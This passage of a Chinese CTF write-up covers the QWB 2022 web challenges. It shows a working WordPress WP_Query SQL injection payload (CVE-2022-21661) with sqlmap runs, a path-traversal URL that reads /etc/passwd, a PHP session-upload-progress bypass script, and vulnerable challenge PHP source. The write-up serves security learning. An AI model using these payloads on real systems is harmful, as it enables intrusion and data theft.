class="string">&quot;chatbox&quot;</span>).<span class="title function_">append</span>(<span class="string">&quot;bot: &quot;</span> + content + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>先改一个我自己的密码试试</p><h2 id="easylogin"><a href="#easylogin" class="headerlink" title="easylogin"></a>easylogin</h2><blockquote><p><a href="http://47.104.251.7/">http://47.104.251.7/</a><br>本题目为渗透题，开放了80和8888两个端口，其余端口均和本题目无关，本题目无需进行目录扫描和爆破<br>(题目每10分钟都会自动恢复初始环境，如果遇到环境不对，请稍等片刻或联系群管寻找出题人，flag位置在常用文件夹下，并非国际通用位置，可以通过创建时间来推断，需要稍微寻找一下)</p></blockquote><p>最初先用wpscan扫一下 发现sql注入漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| [!] Title: WordPress &lt; <span class="number">5.8</span>.<span class="number">3</span> - SQL Injection via WP_Query</span><br><span class="line">|     Fixed <span class="keyword">in</span>: <span class="number">5.8</span>.<span class="number">3</span></span><br><span class="line">|     References:</span><br><span class="line">|      - https:<span class="regexp">//</span>wpscan.com<span class="regexp">/vulnerability/</span><span class="number">7</span>f768bcf-ed33-<span class="number">4</span>b22-b432-d1e7f95c1317</span><br><span class="line">|      - https:<span class="regexp">//</span>cve.mitre.org<span class="regexp">/cgi-bin/</span>cvename.cgi?name=CVE-<span class="number">2022</span>-<span class="number">21661</span></span><br><span class="line">|      - https:<span class="regexp">//gi</span>thub.com<span class="regexp">/WordPress/</span>wordpress-develop<span class="regexp">/security/</span>advisories/GHSA-<span class="number">6676</span>-cqfm-gw84</span><br><span class="line">|      - https:<span class="regexp">//</span>hackerone.com<span class="regexp">/reports/</span><span class="number">1378209</span></span><br></pre></td></tr></table></figure><p>首先是80端口的 sql注入</p><p><a href="https://xz.aliyun.com/t/10841">某Press核心框架WP_Query SQL注入漏洞分析（CVE-2022–21661） - 先知社区 (aliyun.com)</a></p><p>打这里 <a href="http://47.104.251.7/wp-admin/admin-ajax.php">http://47.104.251.7/wp-admin/admin-ajax.php</a></p><p><img src="/2022/07/30/qwb2022/image-20220801132739600.png" alt="image-20220801132739600"></p><p>直接放sqlmap里面可以跑</p><p>payload</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars<span class="comment">[tax_query]</span><span class="comment">[1]</span><span class="comment">[include_children]</span>=1&amp;query_vars<span class="comment">[tax_query]</span><span class="comment">[1]</span><span class="comment">[terms]</span><span class="comment">[1]</span>=1*&amp;query_vars<span class="comment">[tax_query]</span><span class="comment">[1]</span><span class="comment">[field]</span>=term_taxonomy_id</span><br></pre></td></tr></table></figure><p>抓一下包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wp-admin/admin-ajax.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.104.251.7</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>181</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.104.251.7</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.104.251.7/wp-admin/admin-ajax.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">action=aa&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Binclude_children%5D=<span class="number">1</span>&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Bterms%5D%<span class="number">5B1</span>%5D=<span class="number">1</span>*&amp;query_vars%5Btax_query%5D%<span class="number">5B1</span>%5D%5Bfield%5D=term_taxonomy_id</span></span><br></pre></td></tr></table></figure><p>这里可以打一手时间或报错都行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --technique=E</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sqlmap</span> <span class="string">identified</span> <span class="string">the</span> <span class="string">following</span> <span class="string">injection</span> <span class="string">point(s)</span> <span class="string">with</span> <span class="string">a</span> <span class="string">total</span> <span class="string">of</span> <span class="number">425</span> <span class="string">HTTP(s)</span> <span class="attr">requests:</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">Parameter:</span> <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">error-based</span></span><br><span class="line">    <span class="attr">Title:</span> <span class="string">MySQL</span> <span class="string">&gt;=</span> <span class="number">5.0</span> <span class="string">AND</span> <span class="string">error-based</span> <span class="bullet">-</span> <span class="string">WHERE,</span> <span class="string">HAVING,</span> <span class="string">ORDER</span> <span class="string">BY</span> <span class="string">or</span> <span class="string">GROUP</span> <span class="string">BY</span> <span class="string">clause</span> <span class="string">(FLOOR)</span></span><br><span class="line">    <span class="attr">Payload:</span> <span class="string">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=1)</span> <span class="string">AND</span> <span class="string">(SELECT</span> <span class="number">3702 </span><span class="string">FROM(SELECT</span> <span class="string">COUNT(*),CONCAT(0x7170627071,(SELECT</span> <span class="string">(ELT(3702=3702,1))),0x7171786a71,FLOOR(RAND(0)*2))x</span> <span class="string">FROM</span> <span class="string">INFORMATION_SCHEMA.PLUGINS</span> <span class="string">GROUP</span> <span class="string">BY</span> <span class="string">x)a)--</span> <span class="string">SGzg&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>发现有这么几个数据库</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">available databases <span class="comment">[3]</span>:</span><br><span class="line"><span class="comment">[*]</span> information_schema</span><br><span class="line"><span class="comment">[*]</span> moodle</span><br><span class="line"><span class="comment">[*]</span> wordpress</span><br></pre></td></tr></table></figure><p>我发现从wordpress里我只能得到加过盐的密码 没啥用</p><p>看看moodle数据库  翻了半天 发现我也只能找到加过盐的密码 其他的没得到什么有用的信息</p><p>几个我比较感兴趣的数据库</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">| mdl_user_info_field              </span></span><br><span class="line"><span class="string">| mdl_user_lastaccess              </span></span><br><span class="line"><span class="string">| mdl_user_password_history        </span></span><br><span class="line"><span class="string">| mdl_user_password_resets         </span></span><br><span class="line"><span class="string">| mdl_user_preferences             </span></span><br><span class="line"><span class="string">| mdl_user_private_key </span></span><br></pre></td></tr></table></figure><p>看到了 <code>mdl_user_password_resets    </code> 表</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Database: moodle</span><br><span class="line">Table: mdl_user_password_resets</span><br><span class="line"><span class="meta">[5 columns]</span></span><br><span class="line"><span class="code">+-----------------+</span>-------------+</span><br><span class="line"><span class="section">| Column          | Type        |</span></span><br><span class="line"><span class="section">+-----------------+-------------+</span></span><br><span class="line">| id              | bigint(10)  |</span><br><span class="line">| timerequested   | bigint(10)  |</span><br><span class="line">| timererequested | bigint(10)  |</span><br><span class="line">| token           | varchar(32) |</span><br><span class="line"><span class="section">| userid          | bigint(10)  |</span></span><br><span class="line"><span class="section">+-----------------+-------------+</span></span><br></pre></td></tr></table></figure><p>发现这里面有 服了 原来是网站出问题了  草</p><p>我看这里NESE是去审计了代码</p><p><img src="/2022/07/30/qwb2022/image-20220801171434655.png" alt="image-20220801171434655"></p><p>然后就是打一个nday 学到了学到了</p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><blockquote><p>照片墙的内部系统中可能还有什么系统。</p><p><a href="http://47.104.95.124:8080/">http://47.104.95.124:8080/</a></p></blockquote><p>upload.php</p><p><img src="/2022/07/30/qwb2022/image-20220730141152514.png" alt="image-20220730141152514"></p><p><a href="http://47.104.95.124:8080/showfile.php?f=demo/../../../../../../../../../../etc/passwd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">http://47.104.95.124:8080/showfile.php?f=demo/../../../../../../../../../../etc/passwd任意文件读取</a></p><p>/etc/hosts</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>localhost</span><br><span class="line">::<span class="number">1</span>localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::<span class="number">0</span>ip6-localnet</span><br><span class="line">ff00::<span class="number">0</span>ip6-mcastprefix</span><br><span class="line">ff02::<span class="number">1</span>ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span>ip6-allrouters</span><br><span class="line"><span class="number">172.18.0.2</span>3b35825919ae</span><br><span class="line"><span class="number">10.10.10.5</span>3b35825919ae</span><br></pre></td></tr></table></figure><p>/proc/net/arp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">IP</span> address HW type Flags HW address Mask Device</span><br><span class="line"><span class="attribute">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">4</span> <span class="number">0</span>x1 <span class="number">0</span>x0 <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> * eth1</span><br><span class="line"><span class="attribute">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span> <span class="number">0</span>x1 <span class="number">0</span>x2 <span class="number">02</span>:<span class="number">42</span>:<span class="number">0</span>a:<span class="number">0</span>a:<span class="number">0</span>a:<span class="number">0</span>a * eth1</span><br><span class="line"><span class="attribute">4</span> <span class="number">172.18.0.1</span> <span class="number">0</span>x1 <span class="number">0</span>x2 <span class="number">02</span>:<span class="number">42</span>:<span class="number">60</span>:b2:<span class="number">90</span>:eb * eth0</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$upload</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">   @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload</span>, <span class="number">0333</span>, <span class="literal">true</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">       <span class="keyword">include</span> <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>])?!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>]):<span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;fname&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;p class=&#x27;tip&#x27;&gt;guest can not upload file&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了绕这里的  <code>isset($_SESSION)</code></p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">&quot;http://47.104.95.124:8080/upload.php&quot;</span></span><br><span class="line"><span class="attr">f</span> = io.BytesIO(b<span class="string">&quot;t&quot;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line"><span class="attr">r</span> = requests.post(<span class="attr">url=url,</span> <span class="attr">data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:</span> <span class="string">&quot;2333&quot;</span>&#125;, <span class="attr">files=&#123;&quot;file&quot;:</span> (<span class="string">&quot;233.txt&quot;</span>, f)&#125;, <span class="attr">cookies=&#123;&quot;PHPSESSID&quot;:</span> <span class="string">&quot;2333&quot;</span>&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">session_id</span>().<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>])[<span class="number">0</span>].<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;tmp_name&quot;</span>],<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload  &#x27;</span>.<span class="string">&quot;./&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;/&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">e</span>(<span class="variable">$filename</span>).<span class="string">&#x27; success!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">do_upload</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filesize-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;date;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable language_">$this</span>-&gt;file[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Invalid file!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable language_">$this</span>-&gt;file-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contents = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">        <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable language_">$this</span>-&gt;contents);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;schema = <span class="string">&#x27;file:///var/www/html/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">0</span>]-&gt;source;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="number">1</span>]-&gt;schema;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/usr|auto|log/i&#x27;</span> , <span class="variable language_">$this</span>-&gt;source))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable language_">$this</span>-&gt;schema . <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">        <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">        <span class="variable">$src</span> = <span 